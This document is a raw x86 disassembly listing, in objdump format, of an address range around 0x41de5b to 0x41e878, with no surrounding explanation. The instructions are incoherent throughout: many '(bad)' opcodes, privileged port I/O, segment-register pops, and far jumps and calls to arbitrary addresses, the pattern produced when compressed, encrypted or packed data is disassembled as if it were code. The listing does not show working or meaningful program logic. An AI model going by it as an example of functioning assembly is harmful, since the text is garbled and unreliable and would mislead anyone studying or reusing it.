  41de5b:	xor    al,0xca
  41de5d:	fisubr DWORD PTR [ebx-0x628440c4]
  41de63:	pop    ds
  41de64:	mov    edi,0xc1e7a5dc
  41de69:	fsubr  DWORD PTR [esp-0x18572735]
  41de70:	add    ecx,eax
  41de72:	mov    DWORD PTR [esi-0x15],eax
  41de75:	ror    DWORD PTR [ebp-0x7c321719],0x6
  41de7c:	jmp    0x41de2f
  41de7e:	mov    ecx,0x5ac7f61c
  41de83:	pop    ss
  41de84:	jecxz  0x41de32
  41de86:	(bad)  
  41de87:	(bad)  
  41de88:	call   0xf2605d3a
  41de8d:	ret    0xfc86
  41de90:	fiadd  WORD PTR [eax]
	...
  41deba:	sbb    ecx,DWORD PTR [edi-0x76722106]
  41dec0:	enter  0x7ee6,0xba
  41dec4:	aad    0xe2
  41dec6:	ja     0x41de58
  41dec8:	int3   
  41dec9:	add    eax,DWORD PTR [edx+0x413dd78f]
  41decf:	dec    edx
  41ded0:	out    0xeb,eax
  41ded2:	outs   dx,DWORD PTR ds:[esi]
  41ded3:	(bad)  
  41ded4:	mov    bh,0x3d
  41ded6:	xor    DWORD PTR [edx-0x19],ecx
  41ded9:	jmp    0x41df2a
  41dedb:	(bad)  
  41dedc:	mov    bh,0xf4
  41dede:	adc    eax,0x6803d64a
  41dee3:	mov    ds:0x8738e88e,al
  41dee8:	mov    edi,ss
  41deea:	pop    esp
  41deeb:	sbb    DWORD PTR [ecx-0x187fb918],0xffffffd7
  41def2:	pop    esp
  41def3:	cmp    DWORD PTR [ecx-0x18],0x36
  41def7:	test   BYTE PTR [eax],al
  41def9:	jl     0x41de7d
  41defb:	sbb    DWORD PTR [ecx-0x56],ebx
  41defe:	xchg   DWORD PTR [ebx-0x5694ab93],ecx
  41df04:	ins    BYTE PTR es:[edi],dx
  41df05:	push   esp
  41df06:	mov    DWORD PTR [ecx],ebx
  41df08:	push   edx
  41df09:	inc    esi
  41df0a:	jle    0x41de99
  41df0c:	jne    0x41df56
  41df0e:	push   0x7c
  41df10:	pop    esp
  41df11:	sub    bh,BYTE PTR [eax-0x75]
  41df14:	ins    DWORD PTR es:[edi],dx
  41df15:	dec    esp
  41df16:	inc    ebx
  41df17:	test   eax,0x19513c6c
  41df1c:	dec    eax
  41df1d:	aas    
	...
  41df46:	add    BYTE PTR [ecx-0x73],cl
  41df49:	pop    edi
  41df4a:	adc    eax,0x1044b634
  41df4f:	dec    edx
  41df50:	sbb    DWORD PTR [ecx+0x2b],ebx
  41df53:	xor    al,BYTE PTR [esi-0x7bbcff95]
  41df59:	add    BYTE PTR ds:0x11618056,ah
  41df5f:	sub    al,BYTE PTR [esi-0x48dff395]
  41df65:	inc    ecx
  41df66:	(bad)  
  41df67:	cli    
  41df68:	xchg   DWORD PTR [esi+edx*8+0x1f],esp
  41df6c:	mov    bh,0x52
  41df6e:	into   
  41df6f:	clc    
  41df70:	or     DWORD PTR [ebx-0x34],0x3
  41df74:	lea    eax,[eax]
  41df76:	mov    ds:0xd563a43a,al
  41df7b:	retf   0x6e87
  41df7e:	jmp    0xa46d834e
  41df83:	cli    
  41df84:	test   BYTE PTR [ebx-0x42],ah
  41df87:	lds    ebx,FWORD PTR [eax]
  41df89:	pop    ecx
  41df8a:	mov    ecx,0x906687d1
  41df8f:	mov    ebx,0x7ae9717d
  41df94:	mov    BYTE PTR [edi-0x76],ah
  41df97:	pop    ds
  41df98:	mov    bh,0x43
  41df9a:	add    BYTE PTR ds:0x785c6005,ah
  41dfa0:	or     al,0x66
  41dfa2:	arpl   WORD PTR [ebp-0x649e8ed1],ax
  41dfa8:	cli    
  41dfa9:	sub    DWORD PTR [esi+0x0],eax
	...
  41dfd4:	dec    ecx
  41dfd5:	das    
  41dfd6:	std    
  41dfd7:	jb     0x41dfc5
  41dfd9:	or     ah,BYTE PTR [edx+0x73]
  41dfdc:	and    eax,DWORD PTR [esi]
  41dfde:	imul   ebp,DWORD PTR [ecx-0x7b],0x30
  41dfe2:	push   eax
  41dfe3:	imul   ebp,DWORD PTR [ecx],0x1006ffa
  41dfe9:	sub    DWORD PTR [esi+0x73],esp
  41dfec:	fdiv   st(3),st
  41dfee:	imul   ebp,DWORD PTR [ebp+0x25],0x22
  41dff2:	bound  esp,QWORD PTR [esp+ebp*1-0x2]
  41dff6:	cld    
  41dff7:	sub    eax,0x6d0b1b
  41dffc:	neg    BYTE PTR [esi+0x61]
  41dfff:	add    BYTE PTR [ecx],cl
  41e001:	pop    edi
  41e002:	je     0x41e004
  41e004:	or     al,0x5f
  41e006:	outs   dx,BYTE PTR ds:[esi]
  41e007:	add    BYTE PTR [edx],bl
  41e009:	pop    edi
  41e00a:	outs   dx,DWORD PTR ds:[esi]
  41e00b:	add    BYTE PTR ds:0x11475c5c,al
  41e011:	add    DWORD PTR [edi+0x61],ebx
  41e014:	icebp  
  41e015:	cmp    eax,DWORD PTR [edi+ebp*2-0x16]
  41e019:	std    
  41e01a:	push   0x6237e46f
  41e01f:	jb     0x41e026
  41e021:	sub    eax,0x9d42e4a
  41e026:	pusha  
  41e027:	push   0x656ed5f5
  41e02c:	xchg   esi,eax
  41e02d:	add    eax,DWORD PTR [ebx+0x54]
  41e030:	mov    ch,0x5b
  41e032:	cs push ebx
  41e034:	nop
  41e035:	aad    0xfc
  41e037:	inc    ecx
	...
  41e060:	add    BYTE PTR [ecx+0x1c6576fe],dl
  41e066:	enter  0x6fec,0x1c
  41e06a:	cmc    
  41e06b:	jmp    0x41e0e0
  41e06d:	inc    ecx
  41e06e:	xor    ch,bl
  41e070:	pop    esi
  41e071:	sub    BYTE PTR [edx],al
  41e073:	lds    ebx,FWORD PTR [esi+0xf]
  41e076:	xchg   esi,eax
  41e077:	rcr    DWORD PTR [esi+0xf],1
  41e07a:	xchg   ebp,eax
  41e07b:	out    dx,al
  41e07c:	ins    BYTE PTR es:[edi],dx
  41e07d:	push   cs
  41e07e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e07f:	add    al,0x4c
  41e081:	std    
  41e082:	mov    ah,0xf0
  41e084:	add    BYTE PTR ds:[esi-0x4b109d0e],ah
  41e08b:	add    al,0x4c
  41e08d:	std    
  41e08e:	push   esp
  41e08f:	lock push edx
  41e091:	out    dx,eax
  41e092:	sahf   
  41e093:	bnd jmp edi
  41e096:	mov    ds:0x58ec73f1,al
  41e09b:	bnd jae 0x41e0ba
  41e09e:	push   ebp
  41e09f:	in     eax,0x65
  41e0a1:	enter  0xe370,0x71
  41e0a5:	ror    DWORD PTR [ebp-0x42],0x6b
  41e0a9:	mov    ebp,0xc14fec74
  41e0ae:	(bad)  
  41e0af:	jmp    0xe3a7bf0f
  41e0b4:	jns    0x41e037
  41e0b6:	inc    esi
  41e0b7:	lock outs dx,DWORD PTR ds:[esi]
  41e0b9:	jo     0x41e12c
  41e0bb:	fbstp  TBYTE PTR [ebx-0x70]
  41e0be:	sub    esp,ebx
  41e0c0:	pop    DWORD PTR fs:[edx*8+0x41]
	...
  41e0ec:	add    BYTE PTR [eax],al
  41e0ee:	mov    BYTE PTR [ebx],ah
  41e0f0:	mul    DWORD PTR [edx+0x5a]
  41e0f3:	xor    cl,dh
  41e0f5:	(bad)  
  41e0f6:	cmp    DWORD PTR [esi],esp
  41e0f8:	icebp  
  41e0f9:	imul   ebx,DWORD PTR [esi+edi*4],0xffffffcc
  41e0fd:	dec    edi
  41e0fe:	pop    es
  41e0ff:	pop    ecx
  41e100:	es dec esp
  41e102:	inc    ebp
  41e103:	(bad)  
  41e104:	jmp    0x8f9d3064
  41e109:	loopne 0x41e142
  41e10b:	xchg   DWORD PTR [ebx-0x7a7fb41a],edi
  41e111:	xlat   BYTE PTR ds:[ebx]
  41e112:	cmp    al,0x86
  41e114:	jl     0x41e0fe
  41e116:	dec    edx
  41e117:	test   DWORD PTR [ebx-0x5a79a6fd],ecx
  41e11d:	iret   
  41e11e:	jmp    0x41e17a
  41e120:	stos   BYTE PTR es:[edi],al
  41e121:	out    0x1,al
  41e123:	test   DWORD PTR [edx+eiz*8-0x19a97bf1],eax
  41e12a:	or     al,0x45
  41e12c:	push   ebx
  41e12d:	cld    
  41e12e:	out    dx,eax
  41e12f:	pop    edx
  41e130:	sbb    al,al
  41e132:	inc    esi
  41e133:	popf   
  41e134:	xor    edx,esp
  41e136:	imul   ecx,DWORD PTR [ecx-0x76010fb0],0xd
  41e13d:	jmp    0x41e108
  41e13f:	and    edi,0xffffffd7
  41e142:	or     al,0x9f
  41e144:	cld    
  41e145:	mov    ebp,0xd7e7aaef
  41e14a:	in     al,dx
  41e14b:	adc    DWORD PTR [ebx],0xffffffdf
  41e14e:	fistp  QWORD PTR [edi+0x1a]
  41e151:	jmp    0x41e153
	...
  41e17b:	mov    eax,0x2bf20484
  41e180:	test   eax,0xadcfbe36
  41e185:	sub    dl,dl
  41e187:	pop    esi
  41e188:	mov    bh,0x2a
  41e18a:	call   0xdf3c6c01
  41e18f:	mov    WORD PTR [edi-0x7f8c0545],?
  41e195:	stos   DWORD PTR es:[edi],eax
  41e196:	jmp    0x4b2a:0xbdd2b77d
  41e19d:	adc    esi,DWORD PTR [ecx]
  41e19f:	pop    ebp
  41e1a0:	push   ebx
  41e1a1:	jmp    DWORD PTR [esi]
  41e1a3:	pop    edx
  41e1a4:	dec    ebp
  41e1a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1a6:	xor    DWORD PTR [edi],eax
  41e1a8:	dec    esp
  41e1a9:	add    cl,bh
  41e1ab:	push   cs
  41e1ac:	push   esi
  41e1ad:	sub    ebp,DWORD PTR [eax-0x2bc863f4]
  41e1b3:	rcpps  xmm6,XMMWORD PTR [eax]
  41e1b6:	fldln2 
  41e1b8:	cwde   
  41e1b9:	xor    ch,BYTE PTR [edi-0x54b9b1fd]
  41e1bf:	mov    dl,0xb1
  41e1c1:	das    
  41e1c2:	xlat   BYTE PTR ds:[ebx]
  41e1c3:	in     eax,dx
  41e1c4:	mov    dh,0x30
  41e1c6:	popf   
  41e1c7:	mov    BYTE PTR [esi+ebp*2-0x46],bh
  41e1cb:	dec    ebp
  41e1cc:	pop    ebx
  41e1cd:	inc    ebx
  41e1ce:	mov    BYTE PTR [esp+ecx*4+0x15683d46],cl
  41e1d5:	pop    ecx
  41e1d6:	das    
  41e1d7:	pop    ebx
  41e1d8:	mov    DWORD PTR [ecx+0x48],edx
  41e1db:	outs   dx,BYTE PTR ds:[esi]
  41e1dc:	mov    ah,0x6e
  41e1de:	inc    esi
	...
  41e207:	add    BYTE PTR [eax],ah
  41e209:	inc    ebp
  41e20a:	js     0x41e25b
  41e20c:	push   0x3c3b2b15
  41e211:	test   DWORD PTR [eax],eax
  41e213:	sbb    eax,0x1a4bab93
  41e218:	outs   dx,BYTE PTR ds:[esi]
  41e219:	scas   eax,DWORD PTR es:[edi]
  41e21a:	sub    eax,0x5f8b1fd3
  41e21f:	sbb    ch,BYTE PTR ds:0x3c1b6d8e
  41e225:	jne    0x41e25a
  41e227:	fsub   st,st(5)
  41e229:	js     0x41e265
  41e22b:	jmp    0xfba56c62
  41e230:	add    DWORD PTR [esi-0x75a9f395],esi
  41e236:	cmp    ch,cl
  41e238:	jmp    0x40174ec6
  41e23d:	mov    ah,0x64
  41e23f:	(bad)
  41e242:	jno    0x41e21e
  41e244:	xor    eax,0x41e93a8a
  41e249:	pop    ebx
  41e24a:	push   esp
  41e24b:	add    BYTE PTR [eax-0x48acb5d6],dh
  41e251:	es sub al,0x0
  41e254:	and    DWORD PTR [ecx*2+0x73ffab20],0x0
  41e25c:	jae    0x41e282
  41e25e:	dec    ebp
  41e25f:	dec    esi
  41e260:	stos   BYTE PTR es:[edi],al
  41e261:	pop    es
  41e262:	std    
  41e263:	jb     0x41e201
  41e265:	add    al,0x62
  41e267:	jae    0x41e2d4
  41e269:	adc    BYTE PTR [edx+0x6c],ch
	...
  41e294:	add    BYTE PTR [ebp-0x4eb9b3d5],dh
  41e29a:	daa    
  41e29b:	ds push edx
  41e29d:	shr    BYTE PTR [edi+ecx*2],0x6f
  41e2a1:	xchg   edi,eax
  41e2a2:	jmp    FWORD PTR [ecx]
  41e2a4:	inc    esi
  41e2a5:	inc    ecx
  41e2a6:	das    
  41e2a7:	sbb    eax,0x5c502b33
  41e2ac:	push   ebx
  41e2ad:	out    0xc,al
  41e2af:	data16 jo 0x41e283
  41e2b2:	or     edi,ebp
  41e2b4:	push   edx
  41e2b5:	sub    ah,BYTE PTR [ecx]
  41e2b7:	push   ecx
  41e2b8:	push   edi
  41e2b9:	add    al,0x2d
  41e2bb:	inc    edx
  41e2bc:	pop    esp
  41e2bd:	aaa    
  41e2be:	clc    
  41e2bf:	pop    esi
  41e2c0:	outs   dx,DWORD PTR ds:[esi]
  41e2c1:	dec    eax
  41e2c2:	and    dl,BYTE PTR [ecx+0x50]
  41e2c5:	push   ebp
  41e2c6:	dec    ebp
  41e2c7:	cs aaa 
  41e2c9:	stc    
  41e2ca:	and    BYTE PTR [ecx+0x50],dl
  41e2cd:	test   BYTE PTR [ecx],0x6f
  41e2d0:	jbe    0x41e2f2
  41e2d2:	or     eax,0x32f30070
  41e2d7:	dec    ebp
  41e2d8:	and    BYTE PTR [esi-0x8],al
  41e2db:	jno    0x41e34b
  41e2dd:	adc    DWORD PTR [eax+0x46],ebx
  41e2e0:	push   esp
  41e2e1:	and    eax,0xe969463f
  41e2e6:	add    ah,BYTE PTR [edx]
  41e2e8:	fs add eax,0x1c735e28
  41e2ee:	xor    edx,edi
  41e2f0:	ins    BYTE PTR es:[edi],dx
  41e2f1:	outs   dx,BYTE PTR ds:[esi]
  41e2f2:	push   ds
  41e2f3:	add    DWORD PTR [ecx+0x79],edx
  41e2f6:	shl    dh,1
  41e2f8:	bound  eax,QWORD PTR [eax]
	...
  41e322:	dec    esi
  41e323:	(bad)
  41e327:	add    bl,al
  41e329:	jo     0x41e36c
  41e32b:	sar    BYTE PTR [ebx-0x2134e3bd],1
  41e331:	data16 xor bl,ch
  41e334:	jecxz  0x41e3a1
  41e336:	pop    eax
  41e337:	fcomi  st,st(2)
  41e339:	bound  edi,QWORD PTR [edi]
  41e33b:	out    dx,al
  41e33c:	loope  0x41e3af
  41e33e:	and    eax,0xe6cd102
  41e343:	mov    ?,WORD PTR [edi-0x181ffe8e]
  41e349:	jno    0x41e367
  41e34b:	icebp  
  41e34c:	out    0x71,eax
  41e34e:	or     ah,BYTE PTR [edi-0x4e0aac0a]
  41e354:	out    0xff,eax
  41e356:	and    eax,DWORD PTR [edx]
  41e358:	add    DWORD PTR [eax],eax
  41e35a:	ret    
  41e35b:	cdq    
  41e35c:	ret    
  41e35d:	push   ebp
  41e35f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e360:	xchg   ebx,eax
  41e361:	jnp    0x41e300
  41e363:	cmp    al,0xc0
  41e365:	sub    al,0x8a
  41e367:	jmp    0x6656:0x1e44a009
  41e36e:	rcr    DWORD PTR [edx+0x2f0a3204],1
  41e374:	pop    ds
  41e375:	xor    dh,ch
  41e377:	sbb    esi,DWORD PTR [esi]
  41e379:	xor    eax,0x5fb321c
  41e37e:	adc    al,0x29
  41e380:	pop    es
  41e381:	jmp    DWORD PTR [eax]
  41e383:	test   DWORD PTR [ecx],0x1
	...
  41e3ad:	add    BYTE PTR [eax],al
  41e3af:	pop    ds
  41e3b0:	add    al,0xd6
  41e3b2:	ins    BYTE PTR es:[edi],dx
  41e3b3:	or     BYTE PTR [eax],0xfa
  41e3b6:	pop    esi
  41e3b7:	mov    ds,WORD PTR [ebx-0x34]
  41e3ba:	iret   
  41e3bb:	addr16 test ch,cl
  41e3be:	in     al,0x6c
  41e3c0:	cdq    
  41e3c1:	mov    ebx,0xc0ae47d3
  41e3c6:	idiv   DWORD PTR [esi+0x3b]
  41e3c9:	mov    ah,0xe4
  41e3cb:	dec    ecx
  41e3cc:	jl     0x41e394
  41e3ce:	call   0xe2e13f20
  41e3d3:	dec    esp
  41e3d4:	xchg   edi,esp
  41e3d6:	fmul   DWORD PTR [eax+edi*2-0x67]
  41e3da:	add    ecx,DWORD PTR [esp+edi*2-0x66]
  41e3de:	div    BYTE PTR [ebx+0x2ff586a2]
  41e3e4:	pop    ebx
  41e3e5:	mov    ecx,0x7b8236e8
  41e3ea:	call   0xf5d27b2a
  41e3ef:	xchg   ebx,eax
  41e3f0:	mov    dh,0xaa
  41e3f2:	in     al,dx
  41e3f3:	std    
  41e3f4:	ja     0x41e46f
  41e3f6:	out    0xe,eax
  41e3f8:	jle    0x41e44c
  41e3fa:	add    al,0x4a
  41e3fc:	ja     0x41e452
  41e3fe:	in     eax,0x4
  41e400:	pop    ebx
  41e401:	pop    esp
  41e402:	cmc    
  41e403:	dec    BYTE PTR [ebp+edi*8+0x4d80f0e4]
  41e40a:	fcmovnb st,st(0)
  41e40c:	pop    edx
  41e40d:	sti    
  41e40e:	hlt    
  41e40f:	mov    esi,0xdb3b86
	...
  41e43c:	mov    ecx,0xe2e20779
  41e441:	jg     0x41e44f
  41e443:	das    
  41e444:	(bad)  
  41e445:	pop    edx
  41e446:	leave  
  41e447:	add    ebp,DWORD PTR [edx-0x4108fc85]
  41e44d:	dec    edi
  41e44e:	leave  
  41e44f:	add    ecx,ebp
  41e451:	or     DWORD PTR ds:0xf97c90f8,0xae77e6
  41e45b:	add    bl,ch
  41e45d:	jle    0x41e4cd
  41e45f:	adc    eax,0xc8688dff
  41e464:	fidiv  DWORD PTR [ebp-0x52342bb0]
  41e46a:	push   edi
  41e46b:	mov    ch,0xd0
  41e46d:	jl     0x41e4e0
  41e46f:	fcmovb st,st(6)
  41e471:	jle    0x41e4e1
  41e473:	mov    edx,0xba6da31f
  41e478:	retf   
  41e479:	lahf   
  41e47a:	pop    edi
  41e47b:	(bad)
  41e47f:	mov    edx,0x884e8bba
  41e484:	fidivr DWORD PTR [eax+eax*1-0x47]
  41e488:	mov    esi,0xbc9e718a
  41e48d:	mov    esp,DWORD PTR [ecx+ebp*8-0x31]
  41e491:	jle    0x41e505
  41e493:	jge    0x41e4f2
  41e495:	mov    WORD PTR [ebx-0x75],gs
  41e498:	jp     0x41e425
  41e49a:	add    BYTE PTR [ebp-0x7f94747e],bl
	...
  41e4c8:	add    BYTE PTR [ebp-0x50],bh
  41e4cb:	ins    BYTE PTR es:[edi],dx
  41e4cc:	cmp    eax,0xe9638187
  41e4d1:	pop    ebp
  41e4d2:	xor    DWORD PTR [eax+0x2f],0x512ea144
  41e4d9:	inc    ebx
  41e4da:	test   DWORD PTR [eax],eax
  41e4dc:	and    eax,0x44747e5e
  41e4e1:	dec    eax
  41e4e2:	mov    al,0x64
  41e4e4:	add    ch,BYTE PTR [ecx]
  41e4e6:	pop    ebx
  41e4e7:	push   ecx
  41e4e8:	ds lea esi,ss:[ebp+0x8]
  41e4ed:	xor    bh,BYTE PTR [esp+ebx*2+0x2a]
  41e4f1:	cmp    eax,0x430c6677
  41e4f6:	call   0x6d:0xabf81973
  41e4fd:	sub    edx,DWORD PTR [ebx]
  41e4ff:	je     0x41e562
  41e501:	pop    ss
  41e502:	cli    
  41e503:	cld    
  41e504:	inc    ebp
  41e505:	sub    DWORD PTR [edi],esp
  41e507:	sbb    eax,0x71061864
  41e50c:	imul   edx,ebx,0xe26970fd
  41e512:	cli    
  41e513:	sbb    al,0x73
  41e515:	fadd   DWORD PTR [esi]
  41e517:	jae    0x41e57e
  41e519:	(bad)  
  41e51a:	pop    esp
  41e51b:	inc    esi
  41e51c:	push   esp
  41e51d:	mov    ch,0x3c
  41e51f:	fs gs xchg esi,eax
  41e522:	or     BYTE PTR [esi+0x6e],ah
  41e525:	aam    0x8
  41e527:	outs   dx,WORD PTR ds:[esi]
  41e529:	cmp    DWORD PTR [ecx+esi*2],0x73
	...
  41e555:	add    BYTE PTR [eax+0x6945fd06],ch
  41e55b:	sub    al,0x1d
  41e55d:	fs cwde 
  41e55f:	pop    es
  41e560:	jno    0x41e5cb
  41e562:	and    edi,ebp
  41e564:	jo     0x41e5cf
  41e566:	mov    dl,0xfa
  41e568:	sbb    al,0x70
  41e56a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e56b:	pop    es
  41e56c:	jo     0x41e5e5
  41e56e:	mov    ds:0xbb006106,al
  41e573:	sub    BYTE PTR [ebp+0x20],cl
  41e576:	jmp    0xccb6557c
  41e57b:	xor    BYTE PTR [esi+0x74],bl
  41e57e:	fsubr  QWORD PTR [edi]
  41e580:	imul   esp,DWORD PTR [eax],0xffffffc5
  41e583:	das    
  41e584:	outs   dx,DWORD PTR ds:[esi]
  41e585:	je     0x41e5cc
  41e587:	push   ss
  41e588:	push   ecx
  41e589:	push   eax
  41e58a:	and    eax,0x9736203
  41e58f:	imul   esp,DWORD PTR cs:[ecx+0x9],0x2e
  41e594:	ins    BYTE PTR es:[edi],dx
  41e595:	outs   dx,BYTE PTR ds:[esi]
  41e596:	gs std 
  41e598:	pop    ebp
  41e599:	je     0x41e5bf
  41e59b:	sti    
  41e59c:	imul   esp,DWORD PTR [edi+0x1c],0x2
  41e5a0:	ret    
  41e5a1:	push   ebx
  41e5a2:	int3   
  41e5a3:	and    ecx,esi
  41e5a5:	jno    0x41e532
  41e5a7:	pusha  
  41e5a8:	fld    TBYTE PTR [ebx+0x79]
  41e5ab:	adc    eax,0x72704601
  41e5b0:	shl    DWORD PTR [edi+0x79],1
  41e5b3:	push   cs
  41e5b4:	(bad)  
  41e5b6:	sub    DWORD PTR [esi],0x70f1
	...
  41e5e0:	add    BYTE PTR [eax],al
  41e5e2:	add    BYTE PTR [edi+edx*1+0x203a6bdd],al
  41e5e9:	repnz data16 sbb al,0xd5
  41e5ed:	frstor [ebp+0x50]
  41e5f0:	shl    ebx,1
  41e5f2:	jno    0x41e62d
  41e5f4:	out    dx,al
  41e5f5:	mov    edi,0xd1576f3e
  41e5fa:	ins    BYTE PTR es:[edi],dx
  41e5fb:	cmp    al,dh
  41e5fd:	int3   
  41e5fe:	inc    ebp
  41e5ff:	push   eax
  41e600:	sar    BYTE PTR [ebx-0x331ec593],cl
  41e606:	push   eax
  41e607:	inc    ecx
  41e608:	out    dx,al
  41e609:	imul   DWORD PTR [edi+0x1c]
  41e60c:	mov    dh,0xe3
  41e60e:	jae    0x41e60d
  41e610:	mov    ebp,0xee1c71db
  41e615:	ret    0xec53
  41e618:	mov    edx,0x1f365da
  41e61d:	shl    BYTE PTR [edx-0x12],cl
  41e620:	scas   eax,DWORD PTR es:[edi]
  41e621:	out    0x71,eax
  41e623:	loopne 0x41e5cf
  41e625:	icebp  
  41e626:	jae    0x41e662
  41e628:	stos   BYTE PTR es:[edi],al
  41e629:	fild   QWORD PTR [ebx+0x1c]
  41e62c:	jo     0x41e615
  41e62e:	ja     0x41e601
  41e630:	push   esp
  41e631:	(bad)  
  41e632:	data16 rcl BYTE PTR [esi+0x51d06604],0xf1
  41e63a:	enterw 0x1e96,0x67
  41e63f:	retf   0x105a
  41e642:	add    al,0xda
  41e644:	jns    0x41e660
  41e646:	clc    
	...
  41e66f:	add    ah,cl
  41e671:	xchg   BYTE PTR [esi],al
  41e673:	fidivr WORD PTR [esi-0x770dd6c6]
  41e679:	xchg   dl,bh
  41e67b:	call   0xd867420d
  41e680:	pop    ebx
  41e681:	lahf   
  41e682:	add    bl,dh
  41e684:	(bad)  
  41e685:	cmp    eax,0xb2fbe203
  41e68a:	mov    ah,0xe4
  41e68c:	cmp    DWORD PTR [edi-0x3c],0xffffffd2
  41e690:	outs   dx,DWORD PTR ds:[esi]
  41e691:	mov    bl,cl
  41e693:	fdiv   QWORD PTR [eax-0x51]
  41e696:	stos   BYTE PTR es:[edi],al
  41e697:	fisttp DWORD PTR [ebp+0x7e]
  41e69a:	aam    0xe8
  41e69c:	arpl   WORD PTR [edi-0x4c],di
  41e69f:	repnz retf 
  41e6a1:	test   eax,0x864fe5c6
  41e6a6:	enter  0x3ef1,0xaf
  41e6aa:	mov    ch,0xdc
  41e6ac:	cmp    al,0x7e
  41e6ae:	mov    eax,0xc2c7824a
  41e6b4:	xor    BYTE PTR [eax-0x7bf00769],al
  41e6ba:	xchg   ebp,eax
  41e6bb:	out    0xf7,al
  41e6bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6be:	nop
  41e6bf:	fucom  st(5)
  41e6c1:	xor    DWORD PTR [edi-0x31],0xffffffd9
  41e6c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6c6:	xchg   edi,eax
  41e6c7:	add    ecx,ebp
  41e6c9:	jge    0x41e718
  41e6cb:	clc    
  41e6cc:	call   0xc829404c
  41e6d1:	pushf  
  41e6d2:	inc    eax
  41e6d3:	loope  0x41e6d5
	...
  41e6fd:	lock cmp bl,BYTE PTR [ebx+eiz*8]
  41e701:	les    edi,FWORD PTR [edx]
  41e703:	sub    bl,ch
  41e705:	(bad)  
  41e706:	mov    dh,BYTE PTR [eax+edi*8]
  41e709:	ret    0x7c
  41e70c:	dec    esi
  41e70d:	ins    BYTE PTR es:[edi],dx
  41e70e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e70f:	addr16 aas 
  41e711:	data16 jne 0x41e784
  41e714:	inc    ebp
  41e715:	push   ebx
  41e716:	mov    WORD PTR [ebx+0x3d],?
  41e719:	inc    esi
  41e71a:	jg     0x41e77e
  41e71c:	sbb    bl,BYTE PTR [eax]
  41e71e:	lods   al,BYTE PTR ds:[esi]
  41e71f:	addr16 adc eax,0xfa540e03
  41e725:	cli    
  41e726:	mov    eax,DWORD PTR [edi+0x25]
  41e729:	and    BYTE PTR [ebx+0x76ff0566],dl
  41e72f:	jno    0x41e71a
  41e731:	iret   
  41e732:	jle    0x41e7a6
  41e734:	fstp   QWORD PTR [edi]
  41e736:	xchg   ebp,eax
  41e737:	ins    DWORD PTR es:[edi],dx
  41e738:	int    0x3
  41e73a:	jns    0x41e7ae
  41e73c:	jmp    0xc7ac6f42
  41e741:	pop    ds
  41e742:	mov    BYTE PTR [edi-0x29],ah
  41e745:	mov    edx,0x200b3b85
  41e74a:	cmp    DWORD PTR ds:0x57af1ff7,ebp
  41e750:	enter  0x79d9,0x63
  41e754:	mov    eax,ds:0xc977a21f
  41e759:	loope  0x41e704
  41e75b:	push   eax
  41e75c:	jmp    0x83af7310
	...
  41e789:	add    BYTE PTR [edx+0x76d7747a],al
  41e78f:	jg     0x41e7f8
  41e791:	jmp    0x85ad7abf
  41e796:	pop    ds
  41e797:	xchg   esp,eax
  41e798:	xor    eax,0x2f9761b5
  41e79d:	push   ds
  41e79e:	sub    eax,0x2f2b2b4b
  41e7a3:	xchg   ebp,eax
  41e7a4:	xor    al,BYTE PTR [esp]
  41e7a7:	xchg   edi,eax
  41e7a8:	cmp    BYTE PTR [ecx],dl
  41e7aa:	cmp    eax,DWORD PTR [esi+0x32]
  41e7ad:	add    BYTE PTR [ebx+0x1b],dl
  41e7b0:	sub    dh,BYTE PTR [ecx]
  41e7b2:	push   eax
  41e7b3:	inc    edi
  41e7b4:	cmp    BYTE PTR [esi-0xc],al
  41e7b7:	adc    eax,0x19013133
  41e7bc:	xor    al,0x7d
  41e7be:	inc    ebp
  41e7bf:	iret   
  41e7c0:	imul   esi,DWORD PTR [esi+0x14],0x15
  41e7c4:	push   ecx
  41e7c5:	push   eax
  41e7c6:	pop    ebx
  41e7c7:	cmc    
  41e7c8:	pop    esi
  41e7c9:	add    BYTE PTR [ecx-0x30],cl
  41e7cc:	dec    edx
  41e7cd:	push   ebx
  41e7ce:	sub    dh,ch
  41e7d0:	jo     0x41e849
  41e7d2:	adc    al,0x9
  41e7d4:	bound  ebx,QWORD PTR [ebx+edi*1+0x2e]
  41e7d8:	jae    0x41e83b
  41e7da:	inc    ebx
  41e7db:	xor    ecx,DWORD PTR [ebp+0x0]
  41e7de:	or     ebp,DWORD PTR [esi]
  41e7e0:	bound  esp,QWORD PTR [ecx-0x2a]
  41e7e3:	sti    
  41e7e4:	imul   esi,DWORD PTR [ebp-0x25],0x4
  41e7e8:	std    
  41e7e9:	push   edx
  41e7ea:	in     al,0x2c
  41e7ec:	jno    0x41e7ee
	...
  41e816:	add    ch,al
  41e818:	pop    eax
  41e819:	add    BYTE PTR [eax],al
  41e81b:	mov    ch,0x58
  41e81d:	add    BYTE PTR [eax],al
  41e81f:	retf   
  41e820:	pop    eax
  41e821:	cmp    al,0x2f
  41e823:	lds    edi,FWORD PTR [eax+edx*2]
  41e826:	dec    edi
  41e827:	jne    0x41e874
  41e829:	pop    ebx
  41e82a:	push   eax
  41e82b:	xchg   esp,eax
  41e82c:	or     esi,DWORD PTR [eax+0x77]
  41e82f:	call   0x4f3c:0x8532610a
  41e836:	dec    ebp
  41e837:	mov    cl,0x28
  41e839:	pop    esp
  41e83a:	push   eax
  41e83b:	xchg   esp,eax
  41e83c:	or     esi,DWORD PTR [eax+0x77]
  41e83f:	call   0x453c:0x8532610a
  41e846:	dec    ebp
  41e847:	inc    esp
  41e848:	daa    
  41e849:	pop    esp
  41e84a:	push   eax
  41e84b:	aam    0x3
  41e84d:	jo     0x41e8c6
  41e84f:	sbb    al,0x95
  41e851:	mul    BYTE PTR [ebx+0xe]
  41e854:	add    ah,BYTE PTR ds:0xd46de848
  41e85a:	dec    edx
  41e85b:	mov    ebp,0xec5cd8aa
  41e860:	mov    ds:0x4cb370f5,al
  41e865:	mul    BYTE PTR [ebx-0x12]
  41e868:	add    DWORD PTR [ecx],eax
  41e86a:	pop    esp
  41e86b:	fldcw  WORD PTR [edx-0x1b]
  41e86e:	jno    0x41e823
  41e870:	jo     0x41e84b
  41e872:	gs nop
  41e874:	shl    DWORD PTR ds:[esi-0x7e],1
  41e878:	pop    esi
